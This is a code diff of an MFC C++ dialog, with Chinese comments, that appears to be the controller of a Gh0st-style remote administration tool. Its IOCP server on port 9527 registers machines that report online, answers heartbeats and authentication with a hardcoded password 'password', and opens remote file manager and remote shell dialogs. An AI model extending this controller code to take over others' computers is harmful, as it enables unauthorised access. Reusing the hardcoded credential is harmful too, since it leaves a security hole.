@@ -12,6 +12,8 @@
 #endif
 CIOCPServer *m_iocpServer = NULL;
 ListDlg* g_pListDlg = NULL; //在NotifyProc中初始化
+CString		m_PassWord = _T("password");
+CPrincDlg*  g_pPrincDlg = NULL;
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
 
 class CAboutDlg : public CDialogEx
@@ -66,6 +68,8 @@ BEGIN_MESSAGE_MAP(CPrincDlg, CDialogEx)
 	ON_WM_QUERYDRAGICON()
 	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CPrincDlg::OnTcnSelchangeTab1)
 	ON_WM_SIZE()
+	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
+	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 END_MESSAGE_MAP()
 
 
@@ -122,7 +126,9 @@ BOOL CPrincDlg::OnInitDialog()
 		tabRect.Width(), tabRect.Height(),SWP_HIDEWINDOW);
 	m_FileDlg.SetWindowPos(NULL,tabRect.left, tabRect.top,
 		tabRect.Width(), tabRect.Height(),SWP_HIDEWINDOW);
-	Activate(9527,100);
+	Activate(9527,1000);
+// 	int pContext=0;
+// 	this->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
@@ -228,6 +234,7 @@ void CALLBACK CPrincDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UIN
 	{
 		CPrincDlg* pPriDlg = (CPrincDlg*) lpParam;
 		pPriDlg->m_ServerPrincDlg = m_iocpServer;
+		g_pPrincDlg = pPriDlg;
 		// 对g_pListDlg 进行初始化
 		switch (nCode)
 		{
@@ -282,11 +289,83 @@ void CPrincDlg::Activate(UINT nPort, UINT nMaxConnections)
 
 void CPrincDlg::ProcessReceive(ClientContext *pContext)
 {
-
-
+	AfxMessageBox(_T("ProcessReceive called"));
+	return;
 }
 
 void CPrincDlg::ProcessReceiveComplete(ClientContext *pContext)
 {
+	if (pContext == NULL)
+		return;
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
+	// 交给窗口处理
+	if (pContext->m_Dialog[0] > 0)
+	{
+		switch (pContext->m_Dialog[0])
+		{
+		case FILEMANAGER_DLG:
+			((FileDlg *)dlg)->OnReceiveComplete();
+			break;
+		case SHELL_DLG:
+			((ShellDlg *)dlg)->OnReceiveComplete();
+			break;
+		default:
+			break;
+		}
+		return;
+	}
 
+	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	{
+	case TOKEN_AUTH: // 要求验证
+		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
+		break;
+	case TOKEN_HEARTBEAT: // 回复心跳包
+		{
+			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+		break;
+	case TOKEN_LOGIN: // 上线包
+		{
+			if (m_iocpServer->m_nMaxConnections <= g_pPrincDlg->m_ListDlg.m_ComputerCount)
+			{
+				closesocket(pContext->m_Socket);
+			}
+			else
+			{
+				pContext->m_bIsMainSocket = true;
+				g_pPrincDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
+			}
+			// 激活
+			BYTE	bToken = COMMAND_ACTIVED;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+		break;
+	case TOKEN_DRIVE_LIST: // 驱动器列表
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		g_pPrincDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_SHELL_START:
+		g_pPrincDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
+		// 命令停止当前操作
+	default:
+		closesocket(pContext->m_Socket);
+		break;
+	}	
+}
+LRESULT CPrincDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	m_ListDlg.AddToList(pContext);
+	return 0;
+}
+LRESULT CPrincDlg::OnRemoveFromList(WPARAM wParam , LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	m_ListDlg.RemoveFromList(pContext);
+	AfxMessageBox(_T("aaaaaaaaa"));
+	return 0;
 }
